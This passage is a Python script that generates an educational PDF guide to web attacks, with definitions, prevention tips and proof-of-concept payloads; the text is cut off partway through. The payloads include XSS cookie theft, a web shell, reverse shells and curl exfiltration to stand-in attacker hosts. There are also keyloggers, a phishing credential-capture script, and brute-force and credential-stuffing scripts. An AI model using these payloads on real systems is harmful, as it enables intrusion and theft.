from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import cm, mm
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, HRFlowable, KeepTogether
)
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
from reportlab.platypus import Flowable
import reportlab.platypus as platypus

OUTPUT = "/mnt/user-data/outputs/Cybersecurity_Attacks_Complete_Guide.pdf"

# ── Colour palette ──────────────────────────────────────────────────────────
C_DARK   = colors.HexColor("#0D1117")   # near-black bg
C_RED    = colors.HexColor("#E63946")   # accent red
C_ORANGE = colors.HexColor("#FF6B35")   # accent orange
C_YELLOW = colors.HexColor("#FFD60A")   # accent yellow
C_GREEN  = colors.HexColor("#2EC4B6")   # accent teal-green
C_BLUE   = colors.HexColor("#4CC9F0")   # accent blue
C_PURPLE = colors.HexColor("#7B2D8B")   # accent purple
C_LIGHT  = colors.HexColor("#E8E8E8")   # light text
C_WHITE  = colors.white
C_GRAY   = colors.HexColor("#555555")
C_BG_CARD= colors.HexColor("#161B22")
C_BG_CODE= colors.HexColor("#1E2430")

# ── Doc setup ───────────────────────────────────────────────────────────────
doc = SimpleDocTemplate(
    OUTPUT, pagesize=A4,
    leftMargin=1.5*cm, rightMargin=1.5*cm,
    topMargin=1.8*cm, bottomMargin=1.8*cm,
)
W, H = A4

# ── Styles ──────────────────────────────────────────────────────────────────
ss = getSampleStyleSheet()

def S(name, **kw):
    return ParagraphStyle(name, **kw)

sTitle = S("sTitle", fontSize=28, textColor=C_RED, fontName="Helvetica-Bold",
           spaceAfter=4, alignment=TA_CENTER)
sSubtitle = S("sSubtitle", fontSize=13, textColor=C_LIGHT, fontName="Helvetica",
              spaceAfter=2, alignment=TA_CENTER)

sCatHeader = S("sCatHeader", fontSize=18, textColor=C_WHITE,
               fontName="Helvetica-Bold", spaceBefore=10, spaceAfter=6,
               alignment=TA_CENTER)

sAttackTitle = S("sAttackTitle", fontSize=13, textColor=C_YELLOW,
                 fontName="Helvetica-Bold", spaceBefore=8, spaceAfter=3)

sSubAttack = S("sSubAttack", fontSize=11, textColor=C_BLUE,
               fontName="Helvetica-Bold", spaceBefore=4, spaceAfter=2,
               leftIndent=12)

sBody = S("sBody", fontSize=9.5, textColor=C_LIGHT, fontName="Helvetica",
          spaceAfter=4, leading=14, alignment=TA_JUSTIFY)

sCode = S("sCode", fontSize=8.5, textColor=colors.HexColor("#A8FF78"),
          fontName="Courier", backColor=C_BG_CODE,
          spaceBefore=3, spaceAfter=3, leading=12,
          leftIndent=8, rightIndent=8, borderPad=4)

sLabel = S("sLabel", fontSize=8, textColor=C_ORANGE,
           fontName="Helvetica-Bold", spaceAfter=1)

sBullet = S("sBullet", fontSize=9, textColor=C_LIGHT, fontName="Helvetica",
            leftIndent=16, spaceAfter=2, leading=13,
            bulletIndent=6, bulletText="•")

sTip = S("sTip", fontSize=9, textColor=colors.HexColor("#98FB98"),
         fontName="Helvetica-Oblique", leading=13, spaceAfter=2, leftIndent=8)

sFooter = S("sFooter", fontSize=8, textColor=C_GRAY, fontName="Helvetica",
            alignment=TA_CENTER)

sTOC = S("sTOC", fontSize=10, textColor=C_LIGHT, fontName="Helvetica",
         spaceAfter=3, leftIndent=0)

sTOCSub = S("sTOCSub", fontSize=9, textColor=C_BLUE, fontName="Helvetica",
            spaceAfter=2, leftIndent=20)


# ── Helper flowables ─────────────────────────────────────────────────────────
def hr(color=C_RED, thickness=1.5):
    return HRFlowable(width="100%", thickness=thickness, color=color,
                      spaceAfter=4, spaceBefore=4)

def sp(h=0.3):
    return Spacer(1, h*cm)


class ColorBox(Flowable):
    """Full-width colored background box."""
    def __init__(self, bg, height=1.1*cm, text="", text_color=C_WHITE,
                 font="Helvetica-Bold", font_size=15, radius=6):
        super().__init__()
        self.bg = bg; self.height = height; self.text = text
        self.text_color = text_color; self.font = font
        self.font_size = font_size; self.radius = radius
        self.width = W - 3*cm

    def draw(self):
        c = self.canv
        c.setFillColor(self.bg)
        c.roundRect(0, 0, self.width, self.height, self.radius, fill=1, stroke=0)
        if self.text:
            c.setFillColor(self.text_color)
            c.setFont(self.font, self.font_size)
            c.drawCentredString(self.width/2, self.height/2 - self.font_size/3,
                                self.text)
    def wrap(self, *_):
        return self.width, self.height


class AttackCard(Flowable):
    """Draws the entire card background for an attack section."""
    def __init__(self, height):
        super().__init__()
        self.card_height = height
        self.width = W - 3*cm

    def draw(self):
        c = self.canv
        c.setFillColor(C_BG_CARD)
        c.roundRect(0, 0, self.width, self.card_height, 8, fill=1, stroke=0)
        c.setStrokeColor(C_GRAY)
        c.setLineWidth(0.4)
        c.roundRect(0, 0, self.width, self.card_height, 8, fill=0, stroke=1)

    def wrap(self, *_):
        return self.width, self.card_height


def badge(text, bg=C_RED):
    data = [[Paragraph(f'<font color="white"><b>{text}</b></font>',
                       ParagraphStyle("b", fontSize=8, fontName="Helvetica-Bold",
                                      alignment=TA_CENTER))]]
    t = Table(data, colWidths=[3.5*cm], rowHeights=[0.45*cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0,0), (-1,-1), bg),
        ("ROUNDEDCORNERS", [4]),
        ("ALIGN", (0,0), (-1,-1), "CENTER"),
        ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
    ]))
    return t


def section_header(title, color=C_RED, icon=""):
    return ColorBox(color, height=1.2*cm, text=f"{icon}  {title}",
                    font_size=14)


def attack_block(num, title, severity, definition, simple_explain,
                 example, poc_code, prevention, sub_attacks=None,
                 accent=C_YELLOW):
    """Build a complete attack entry."""
    items = []
    # Title row
    title_para = Paragraph(
        f'<font color="{accent.hexval()}">'
        f'<b>{num}. {title}</b></font>',
        sAttackTitle)

    sev_colors = {"CRITICAL": C_RED, "HIGH": C_ORANGE,
                  "MEDIUM": C_YELLOW, "LOW": C_GREEN}
    sev_bg = sev_colors.get(severity, C_GRAY)

    title_table = Table(
        [[title_para, badge(f"⚠ {severity}", sev_bg)]],
        colWidths=[12*cm, 3.5*cm]
    )
    title_table.setStyle(TableStyle([
        ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
        ("ALIGN", (1,0), (1,0), "RIGHT"),
    ]))
    items.append(title_table)
    items.append(sp(0.15))
    items.append(hr(accent, 0.8))

    if sub_attacks:
        sub_text = "  |  ".join([f'<font color="{C_BLUE.hexval()}">{s}</font>'
                                  for s in sub_attacks])
        items.append(Paragraph(f"<b>Types:</b> {sub_text}", sBody))

    items.append(Paragraph('<font color="#FF6B35"><b>📖 Definition</b></font>', sLabel))
    items.append(Paragraph(definition, sBody))

    items.append(Paragraph('<font color="#4CC9F0"><b>🧠 Simple Explanation</b></font>', sLabel))
    items.append(Paragraph(simple_explain, sBody))

    items.append(Paragraph('<font color="#FFD60A"><b>💡 Real-World Example</b></font>', sLabel))
    items.append(Paragraph(example, sBody))

    items.append(Paragraph('<font color="#A8FF78"><b>💻 PoC / Attack Simulation</b></font>', sLabel))
    items.append(Paragraph(poc_code, sCode))

    items.append(Paragraph('<font color="#2EC4B6"><b>🛡 Prevention</b></font>', sLabel))
    items.append(Paragraph(prevention, sBody))
    items.append(sp(0.2))
    items.append(hr(C_GRAY, 0.5))

    return items


# ════════════════════════════════════════════════════════════════════════════
#  ALL ATTACK DATA
# ════════════════════════════════════════════════════════════════════════════

attacks = []   # list of (category_title, cat_color, cat_icon, [attack_dicts])

# ── CLIENT-SIDE ──────────────────────────────────────────────────────────────
client = [
  dict(num=1, title="Cross-Site Scripting (XSS)",
       severity="HIGH",
       sub_attacks=["Stored XSS","Reflected XSS","DOM XSS"],
       definition="XSS is a vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. The browser executes the script because it trusts the website.",
       simple_explain="Imagine a guestbook on a website. You write your name, but a hacker writes a JavaScript script instead. Every visitor who views the guestbook runs that script — stealing cookies, redirecting users, or showing fake login forms.",
       example="A forum allows HTML in posts. Hacker posts: <script>document.location='http://evil.com/steal?c='+document.cookie</script>. Every user who views the post has their session cookie sent to the attacker.",
       poc_code="""<!-- Stored XSS: Injected into DB, served to all users -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- Reflected XSS: URL parameter reflected without sanitisation -->
https://victim.com/search?q=<script>alert(document.cookie)</script>

<!-- DOM XSS: Unsafe JS reads URL hash -->
// Vulnerable code:
document.getElementById('out').innerHTML = location.hash.slice(1);
// Attack URL:
https://victim.com/page#<img src=x onerror=alert(1)>""",
       prevention="Encode output (HTML entities). Use Content-Security-Policy header. Validate/sanitise all inputs. Use modern frameworks (React, Angular) that auto-escape. HttpOnly flag on cookies."),

  dict(num=2, title="Clickjacking",
       severity="MEDIUM",
       definition="Clickjacking tricks a user into clicking something different from what they perceive. An attacker overlays a transparent iframe of a legitimate site over a fake page.",
       simple_explain="Think of a magic trick where someone places glass over a button. You think you're clicking 'Win a Prize!' but you're actually clicking 'Transfer $500' on your bank site hidden behind.",
       example="A hacker creates a page with a button 'Click to claim reward'. Behind it is an invisible iframe of facebook.com/like pointing to their malicious page. User clicks and unknowingly likes the page.",
       poc_code="""<!-- Clickjacking PoC -->
<html>
<style>
  iframe {
    opacity: 0.0;          /* invisible iframe */
    position: absolute;
    top: 0; left: 0;
    width: 900px; height: 600px;
    z-index: 2;
  }
  button {
    position: absolute;
    top: 300px; left: 200px;
    z-index: 1;
    font-size: 24px;
  }
</style>
<button>🎁 Click to Win Prize!</button>
<iframe src="https://victim-bank.com/transfer?amount=500&to=hacker"></iframe>
</html>""",
       prevention="Set X-Frame-Options: DENY or SAMEORIGIN. Use Content-Security-Policy: frame-ancestors 'none'. Implement frame-busting JS as fallback."),

  dict(num=3, title="Cross-Site Request Forgery (CSRF)",
       severity="HIGH",
       definition="CSRF forces an authenticated user's browser to send an unwanted request to a web application. The attacker exploits the trust a site has in the user's browser.",
       simple_explain="You're logged into your bank. You visit a hacker's site which has a hidden form that submits to your bank's transfer URL. Your browser sends the request WITH your session cookie — your bank thinks it's you!",
       example="Attacker sends email with link to evil.com. Page loads an invisible form: POST to bank.com/transfer?to=hacker&amount=10000. Since victim is logged in, browser auto-sends their cookie and money transfers.",
       poc_code="""<!-- CSRF PoC: Auto-submitting form -->
<html>
<body onload="document.forms[0].submit()">
<form action="https://victim-bank.com/api/transfer"
      method="POST" style="display:none">
  <input name="to"     value="hacker_account">
  <input name="amount" value="10000">
  <input name="csrf"   value="">  <!-- no token = vulnerable -->
</form>
<p>Loading your prize... please wait</p>
</body>
</html>""",
       prevention="Use CSRF tokens (random, per-session). SameSite=Strict cookie attribute. Check Origin/Referer headers. Require re-authentication for sensitive actions."),

  dict(num=4, title="HTML Injection",
       severity="MEDIUM",
       definition="HTML Injection occurs when user input is reflected in a page without proper sanitisation, allowing an attacker to inject arbitrary HTML tags and alter page content.",
       simple_explain="Like writing on a whiteboard that everyone reads — if the site doesn't clean your text, you can write fake buttons, fake login forms, or misleading messages that other users see.",
       example="A profile name field accepts: <h1>BANK ALERT: Click here to verify</h1><a href='evil.com'>Verify Now</a>. Other users see a convincing fake bank alert within the real site.",
       poc_code="""<!-- Basic HTML Injection -->
Payload in name field:
<h2 style='color:red'>⚠ Security Alert: Your account is compromised!</h2>
<a href='https://evil.com/phish'>Click here to secure your account</a>

<!-- Form injection to steal credentials -->
<form action='https://attacker.com/capture' method='POST'>
  Username: <input name='u'><br>
  Password: <input type='password' name='p'><br>
  <input type='submit' value='Login'>
</form>""",
       prevention="Sanitise all user inputs. Encode HTML characters (&lt; &gt; &amp;). Use allowlist for permitted tags. Never insert raw user data into HTML."),

  dict(num=5, title="Open Redirect",
       severity="MEDIUM",
       definition="Open Redirect occurs when a web application accepts a user-controlled URL and redirects to it without validation, allowing attackers to redirect users to malicious sites.",
       simple_explain="Imagine a trusted website has a 'go to' link. A hacker crafts a URL like: bank.com/redirect?url=evil.com. Users trust bank.com so they click — but end up on the hacker's phishing page.",
       example="Login page: bank.com/login?next=https://evil.com/phish. After login, user is redirected to the phishing site. Attacker sends this link in a phishing email, users trust the bank.com domain.",
       poc_code="""# Vulnerable server-side code (Python/Flask):
@app.route('/redirect')
def redirect_page():
    url = request.args.get('url')
    return redirect(url)   # No validation!

# Attack URLs:
https://trusted.com/redirect?url=https://evil.com
https://trusted.com/redirect?url=//evil.com
https://trusted.com/redirect?url=%2F%2Fevil.com

# Bypass filters:
?url=https://evil.com%23trusted.com
?url=https://trusted.com@evil.com""",
       prevention="Validate redirect URLs against an allowlist. Use relative paths only. Show interstitial warning page. Never trust user-supplied redirect URLs."),

  dict(num=6, title="Phishing",
       severity="HIGH",
       definition="Phishing is a social engineering attack where attackers impersonate legitimate entities (banks, companies) to trick users into revealing credentials, financial data, or installing malware.",
       simple_explain="Imagine receiving an email that looks exactly like it's from Netflix saying 'Your account will be suspended — verify now.' The link goes to a fake Netflix page that steals your username and password.",
       example="Attacker clones the Gmail login page, hosts it at g00gle.com, sends emails to thousands of users. Victims enter credentials — attacker captures them in a database in real time.",
       poc_code="""# Phishing site setup (educational overview):
1. Clone legitimate site:
   $ wget -mk https://target.com

2. Modify form action to capture credentials:
   <form action="https://attacker.com/capture.php" method="POST">

3. Capture script (capture.php):
   <?php
   $user = $_POST['username'];
   $pass = $_POST['password'];
   file_put_contents('creds.txt', "$user:$pass\n", FILE_APPEND);
   header('Location: https://real-target.com'); // redirect back
   ?>

4. Host on look-alike domain: paypa1.com, g00gle.com, etc.""",
       prevention="Enable MFA. Train users to check URLs carefully. Use email filters (SPF, DKIM, DMARC). Browser phishing protection. Hardware security keys."),

  dict(num=7, title="Malicious File Upload",
       severity="HIGH",
       definition="A vulnerability where an application allows uploading of dangerous file types (PHP, JS, EXE) that can be executed on the server, leading to Remote Code Execution (RCE).",
       simple_explain="You upload a profile picture. But what if you upload a PHP file instead? If the server runs it — the attacker now controls the server! Like sneaking a bomb inside a gift box.",
       example="An image upload form only checks the file extension (.jpg) not the content. Attacker renames shell.php to shell.jpg and uploads it. Server executes it at /uploads/shell.jpg — giving full server access.",
       poc_code="""# Web shell payload (PHP):
<?php system($_GET['cmd']); ?>
# Save as: shell.php → rename to shell.php.jpg or shell.pHp

# Bypass extension filters:
shell.php.jpg   shell.php%00.jpg   shell.pHp   shell.php5

# After upload, access:
https://victim.com/uploads/shell.php?cmd=whoami
https://victim.com/uploads/shell.php?cmd=cat+/etc/passwd
https://victim.com/uploads/shell.php?cmd=id

# Reverse shell via upload:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"); ?>""",
       prevention="Validate file type by magic bytes (not extension). Store uploads outside web root. Rename uploaded files. Use a CDN/separate domain for user content. Disable script execution in upload directories."),

  dict(num=8, title="Browser Exploitation",
       severity="CRITICAL",
       definition="Browser exploitation targets vulnerabilities in browsers or their components (JS engines, PDF readers, media parsers) to execute malicious code on the victim's machine.",
       simple_explain="Your browser is software with bugs. A hacker hosts a specially crafted webpage that exploits a bug in Chrome/Firefox — when you visit, malware installs without you clicking anything. Called a 'drive-by download'.",
       example="A zero-day in Chrome's V8 JS engine allows heap overflow. Attacker hosts exploit page. Victim visits. Exploit runs silently, drops malware, and gives attacker full access — all from one page visit.",
       poc_code="""# BeEF (Browser Exploitation Framework) - educational:
# Start BeEF:
$ cd /opt/beef && ./beef

# Hook script injected via XSS:
<script src="http://attacker.com:3000/hook.js"></script>

# BeEF capabilities once hooked:
- Steal cookies / keylog
- Screenshot browser
- Redirect victim
- Port scan internal network
- Fingerprint browser + plugins
- Social engineering popups

# Metasploit browser exploit example:
msf> use exploit/multi/browser/java_jre17_exec
msf> set SRVHOST attacker_ip
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> exploit""",
       prevention="Keep browser and plugins updated. Enable auto-updates. Use NoScript/uBlock. Disable unnecessary plugins. Use sandboxed browsers. Implement CSP headers."),

  dict(num=9, title="Session Hijacking",
       severity="HIGH",
       definition="Session hijacking is stealing or forging a user's session token to impersonate them on a web application without knowing their credentials.",
       simple_explain="When you log in, the website gives you a 'ticket' (session cookie). If a hacker steals that ticket, they can pretend to be you — without ever needing your password. Like stealing your hotel key card.",
       example="User logs into bank on public WiFi. Attacker on same network uses Wireshark to capture HTTP traffic and sees: Cookie: SESSIONID=abc123. Attacker puts that cookie in their browser — they're now logged in as the victim.",
       poc_code="""# Session stealing via XSS:
<script>
  new Image().src = "https://attacker.com/steal?c=" 
                    + encodeURIComponent(document.cookie);
</script>

# Network sniffing (non-HTTPS):
$ sudo tcpdump -i eth0 -A 'tcp port 80' | grep -i 'cookie'

# Using stolen session with curl:
$ curl -H "Cookie: PHPSESSID=abc123def456" https://victim.com/dashboard

# Session fixation attack:
1. Attacker gets valid session ID from site
2. Tricks victim into using that ID (via URL)
3. Victim logs in → attacker's session is now authenticated""",
       prevention="Use HTTPS everywhere. HttpOnly + Secure flags on cookies. Regenerate session ID after login. Short session timeouts. Implement session binding (IP + User-Agent)."),

  dict(num=10, title="Keylogging",
       severity="HIGH",
       definition="Keylogging records every keystroke a user makes, capturing passwords, credit card numbers, messages, and other sensitive information without their knowledge.",
       simple_explain="A keylogger is like a spy hiding under your keyboard, writing down every key you press. You type your bank password — the spy writes it down and sends it to the hacker.",
       example="Victim installs a 'free game' that secretly installs a keylogger. Everything typed — passwords, emails, credit cards — is silently emailed to the attacker every hour.",
       poc_code="""# JavaScript keylogger (client-side, educational):
document.addEventListener('keydown', function(e) {
  fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key), 
        {mode: 'no-cors'});
});

# Python keylogger concept (educational):
from pynput import keyboard
import requests

log = ""
def on_press(key):
    global log
    log += str(key)
    if len(log) > 50:
        requests.post('http://attacker.com/capture', data={'keys': log})
        log = ""

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()""",
       prevention="Use virtual keyboards for sensitive input. Install reputable antivirus/EDR. Keep OS updated. Use password managers (auto-fill bypasses keyloggers). Enable 2FA."),
]

# ── SERVER-SIDE: INJECTION ────────────────────────────────────────────────────
injection = [
  dict(num=1, title="SQL Injection (SQLi)",
       severity="CRITICAL",
       sub_attacks=["Error-Based","Union-Based","Blind","Time-Based"],
       definition="SQL Injection occurs when user-supplied data is inserted into SQL queries without proper sanitisation, allowing attackers to manipulate database queries.",
       simple_explain="Imagine a login form that checks: SELECT * FROM users WHERE username='INPUT'. If you type: ' OR 1=1 -- the query becomes: WHERE username='' OR 1=1 -- which is always true. You're in!",
       example="Login form: username = admin'-- (comment out password check). Query becomes: SELECT * FROM users WHERE username='admin'-- AND password='anything'. Logs in as admin without password.",
       poc_code="""-- Error-Based SQLi (extract data via errors):
' AND extractvalue(1,concat(0x7e,version()))--

-- Union-Based SQLi (append query to get data):
' UNION SELECT 1,username,password FROM users--

-- Blind SQLi (true/false responses):
' AND SUBSTRING(username,1,1)='a'--

-- Time-Based Blind SQLi:
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- sqlmap automated exploitation:
$ sqlmap -u "https://target.com/item?id=1" --dbs
$ sqlmap -u "https://target.com/item?id=1" -D mydb -T users --dump""",
       prevention="Use parameterised queries / prepared statements. ORM frameworks. Input validation. Principle of least privilege on DB accounts. WAF deployment."),

  dict(num=2, title="Command Injection",
       severity="CRITICAL",
       definition="Command Injection allows attackers to execute arbitrary OS commands on the server by injecting them into input fields that are passed to system shell commands.",
       simple_explain="A site pings an IP you enter: ping 8.8.8.8. What if you type: 8.8.8.8; cat /etc/passwd? The server runs BOTH commands! Like telling your assistant 'Buy milk; also empty the safe'.",
       example="A web app: system('ping -c 1 ' + user_input). Input: google.com; wget http://evil.com/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m — downloads and runs malware on the server.",
       poc_code="""# Common command injection payloads:
; whoami
| id
&& cat /etc/passwd
`id`
$(id)

# Chaining commands:
8.8.8.8; ls -la /var/www/html
8.8.8.8 && cat /etc/shadow
8.8.8.8 | nc attacker.com 4444 -e /bin/bash

# URL encoded:
8.8.8.8%3B+cat+/etc/passwd

# Out-of-band exfiltration:
127.0.0.1; curl http://attacker.com/$(whoami)

# Python detection:
import subprocess
result = subprocess.run(['ping', '-c', '1', user_ip],  # SAFE
                       capture_output=True)  # No shell=True!""",
       prevention="Never use shell=True with user input. Use parameterised APIs. Allowlist valid input characters. Run server with minimal privileges. Sanitise all inputs."),

  dict(num=3, title="LDAP Injection",
       severity="HIGH",
       definition="LDAP Injection occurs when user input is used in LDAP queries without sanitisation, allowing attackers to manipulate directory service queries to bypass auth or extract data.",
       simple_explain="LDAP is like a phone book for corporate networks. If you can inject special characters into a search, you can say 'show me ALL users' instead of just one — stealing the whole directory.",
       example="Login: (&(user=INPUT)(password=INPUT)). With input: *)(uid=*))(|(uid=*, the filter becomes: (&(user=*)(uid=*))(|(uid=*)(password=x)). This matches all users — bypass authentication.",
       poc_code="""# LDAP Injection payloads:
# Authentication bypass:
username: *
username: admin)(&)
username: admin)(&(password=*)
username: *)(&

# Full query manipulation:
# Normal:  (&(uid=USER)(userPassword=PASS))
# Inject:  (&(uid=admin)(*))(&(x=1)(userPassword=PASS))

# Data extraction (blind):
# Test if first char of password is 'a':
admin)(userPassword=a*

# LDAP wildcard enumeration:
a*    → finds all users starting with 'a'
*admin* → finds users containing 'admin'""",
       prevention="Escape special LDAP characters (*, (, ), \\, NUL). Use LDAP libraries with built-in escaping. Validate and allowlist input. Use parameterised LDAP queries."),

  dict(num=4, title="XML Injection / XXE",
       severity="HIGH",
       sub_attacks=["XML Injection","XXE (XML External Entity)"],
       definition="XXE (XML External Entity) Injection exploits weakly configured XML parsers that process external entity references, allowing file disclosure, SSRF, or RCE.",
       simple_explain="XML files can reference external files (like a shortcut). If the server parses XML with external entities enabled, you can define an entity that reads /etc/passwd and include it in your response — server hands you the file!",
       example="An API accepts XML. Attacker sends XML with entity: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>. The parser fetches the file and includes its content in the response — full password file exposed.",
       poc_code="""<!-- XXE: Read local file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- XXE: SSRF to internal network -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE: exfiltrate via DNS -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>""",
       prevention="Disable external entity processing in XML parser. Use less complex formats (JSON). Update/patch XML libraries. Input validation. Whitelist allowed entities."),
]

# ── SERVER-SIDE: AUTH ─────────────────────────────────────────────────────────
auth_attacks = [
  dict(num=5, title="Brute Force Attack",
       severity="HIGH",
       definition="Brute force systematically tries all possible username/password combinations until the correct one is found, exploiting weak passwords and lack of lockout mechanisms.",
       simple_explain="Like trying every key on a huge keyring until one opens the door. With computers doing millions of tries per second, even 'password123' falls in seconds.",
       example="Attacker uses Hydra to brute force admin panel: tries 10 million passwords from wordlist against admin account. App has no lockout — after 2 hours, finds password: 'admin2023'.",
       poc_code="""# Hydra brute force:
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
        target.com http-post-form \
        "/login:username=^USER^&password=^PASS^:Invalid password"

# Burp Suite Intruder: mark password field, load wordlist

# Python script:
import requests
passwords = open('rockyou.txt').read().splitlines()
for pwd in passwords:
    r = requests.post('https://target.com/login',
                      data={'user':'admin','pass':pwd})
    if 'dashboard' in r.text:
        print(f'Found: {pwd}'); break

# Medusa:
$ medusa -h target.com -u admin -P passwords.txt -M http""",
       prevention="Account lockout after N failed attempts. CAPTCHA. Rate limiting. MFA. Strong password policy. Alert on multiple failures."),

  dict(num=6, title="Credential Stuffing",
       severity="HIGH",
       definition="Credential stuffing uses leaked username/password pairs from previous data breaches to gain unauthorised access to other accounts, exploiting password reuse.",
       simple_explain="If your LinkedIn gets hacked and you use the same password on your bank — the hacker tries those LinkedIn credentials on every major bank, email, and shopping site. It works because 65% of people reuse passwords.",
       example="500M credentials leaked from Rockyou2024. Attackers automate trying each pair on Netflix, Gmail, PayPal. 1% success = 5 million accounts compromised — with ZERO hacking of those specific sites.",
       poc_code="""# Credential stuffing with Sentry MBA / OpenBullet (educational):
# 1. Obtain leaked credential list: user:pass format
# 2. Configure target site config (URL, form fields, success string)
# 3. Run with rotating proxies to avoid IP blocks

# Python example:
import requests
creds = [line.split(':') for line in open('leaked.txt')]
proxies_list = open('proxies.txt').readlines()

for user, password in creds:
    proxy = {'http': random.choice(proxies_list).strip()}
    r = requests.post('https://target.com/login',
                      data={'email': user, 'pass': password},
                      proxies=proxy)
    if 'Welcome' in r.text:
        print(f'VALID: {user}:{password}')""",
       prevention="MFA on all accounts. Password breach monitoring (HaveIBeenPwned API). Detect impossible travel. Bot detection / CAPTCHA. Use unique passwords (password manager)."),

  dict(num=7, title="Broken Authentication",
       severity="CRITICAL",
       definition="Broken Authentication refers to flaws in authentication implementation — weak session tokens, improper password storage, missing MFA, insecure password reset — that allow attackers to assume other users' identities.",
       simple_explain="Good authentication is like a strong lock. Broken authentication means the lock is poorly made — maybe it accepts master keys, gives hints about the combination, or can be bypassed by going through the window.",
       example="Password reset sends a 4-digit code via email. Code expires in 24 hours. Attacker automates trying all 10,000 combinations — takes only seconds. Account taken over without knowing the password.",
       poc_code="""# Testing for broken auth:
# 1. Check for predictable session tokens:
SessionID: user_123_1234567890  ← predictable!

# 2. Test password reset token reuse:
GET /reset?token=abc123  # use same token twice — if works = broken

# 3. JWT weak secret attack:
$ hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt

# 4. Insecure direct session manipulation:
Cookie: role=user  → change to → Cookie: role=admin

# 5. Enumerate usernames via different error messages:
"User not found"   vs   "Wrong password"   → username confirmed

# 6. Timing attack on token comparison:
Measure response time for valid vs invalid tokens""",
       prevention="Use proven auth frameworks. Strong password hashing (bcrypt, Argon2). MFA. Secure session tokens (128-bit random). Short session expiry. Constant-time token comparison."),

  dict(num=8, title="Session Fixation",
       severity="MEDIUM",
       definition="Session Fixation allows an attacker to set a known session ID before the user authenticates. After login, the server uses that same ID — giving the attacker access to the authenticated session.",
       simple_explain="Imagine giving someone a specific hotel key BEFORE they check in. When they check in, the front desk activates THAT key. Now you can open their room because you already have a copy of the key!",
       example="Attacker visits login page, gets SessionID=XYZ. Sends victim: bank.com/login?sessionid=XYZ. Victim logs in. Server keeps sessionid=XYZ for authenticated session. Attacker uses same XYZ — they're in!",
       poc_code="""# Session Fixation Attack Flow:
1. Attacker visits target.com → gets: Set-Cookie: PHPSESSID=attacker_chosen_id

2. Craft URL with fixed session:
   https://victim-site.com/login?PHPSESSID=abc123fixed

3. Victim clicks link, logs in successfully

4. Server keeps same session ID: abc123fixed

5. Attacker sends: Cookie: PHPSESSID=abc123fixed → authenticated!

# Testing:
- Note session ID before login
- Log in
- Check if session ID changed after login
- If SAME → vulnerable to session fixation

# Vulnerable PHP code:
session_id($_GET['sid']);  // Never do this!
session_start();""",
       prevention="Always regenerate session ID after successful authentication. Never accept session IDs from URL parameters. Invalidate old sessions on login. Use HttpOnly + Secure cookies."),
]

# ── ACCESS CONTROL ────────────────────────────────────────────────────────────
access_ctrl = [
  dict(num=9, title="IDOR (Insecure Direct Object Reference)",
       severity="HIGH",
       definition="IDOR occurs when an application uses user-supplied input to access objects without authorisation checks, allowing attackers to access other users' data by modifying identifiers.",
       simple_explain="Your order URL is: /orders/12345. What if you change it to /orders/12346? If the server doesn't check that order 12346 belongs to YOU — you just saw someone else's private order. That's IDOR.",
       example="Banking app: /api/account/1001/statement returns your statement. Attacker tries /api/account/1002/statement — gets another customer's complete financial statement. No hacking needed — just change a number.",
       poc_code="""# IDOR Testing:
# 1. Find object references in URLs:
GET /api/user/1337/profile
GET /download?file_id=456
GET /invoice/2024-001.pdf

# 2. Modify the ID and check response:
GET /api/user/1338/profile    → 200 OK? VULNERABLE!
GET /api/user/1/profile       → Gets admin profile?

# 3. Horizontal privilege escalation:
# Your account: user_id=100
# Request: GET /api/messages?user=101  → reads other user's DMs

# 4. IDOR in POST body:
POST /api/update_email
{"user_id": 999, "email": "hacker@evil.com"}

# 5. Encoded IDs (decode first):
/user/dXNlcl8xMDA=  → base64 → user_100  → try user_101""",
       prevention="Implement server-side authorisation on EVERY request. Use indirect references (random UUIDs instead of sequential IDs). Verify object ownership before returning data."),

  dict(num=10, title="Privilege Escalation",
       severity="CRITICAL",
       sub_attacks=["Vertical Privilege Escalation","Horizontal Privilege Escalation"],
       definition="Privilege escalation is gaining more permissions than initially granted. Vertical = gaining higher role (user→admin). Horizontal = accessing another user's resources at same level.",
       simple_explain="Vertical: You're a regular employee who finds the CEO's badge and now has executive access. Horizontal: You're in Room 101 and use a bug to access Room 102 — same level, wrong person.",
       example="Vertical: App checks admin via: if user.role == 'admin'. Attacker edits cookie: role=user to role=admin. Access granted. Horizontal: User A views /documents/100. Changes to /documents/101 — gets User B's document.",
       poc_code="""# Vertical Privilege Escalation:
# 1. Cookie/parameter tampering:
Cookie: role=user  →  Cookie: role=admin
Cookie: isAdmin=false  →  Cookie: isAdmin=true

# 2. JWT claim manipulation (without signature):
{"sub":"user1","role":"user"}
→ {"sub":"user1","role":"administrator"}

# 3. Mass assignment (auto-bind all params):
POST /register
{"username":"hack","password":"x","role":"admin"}

# 4. Hidden admin endpoints:
/admin, /administrator, /manage, /staff, /console

# Horizontal Privilege Escalation:
# Force browse to another user's resource:
/profile?id=101  /invoice?ref=10023  /api/data?owner=user2

# Test with two accounts: account A tries to access B's resources""",
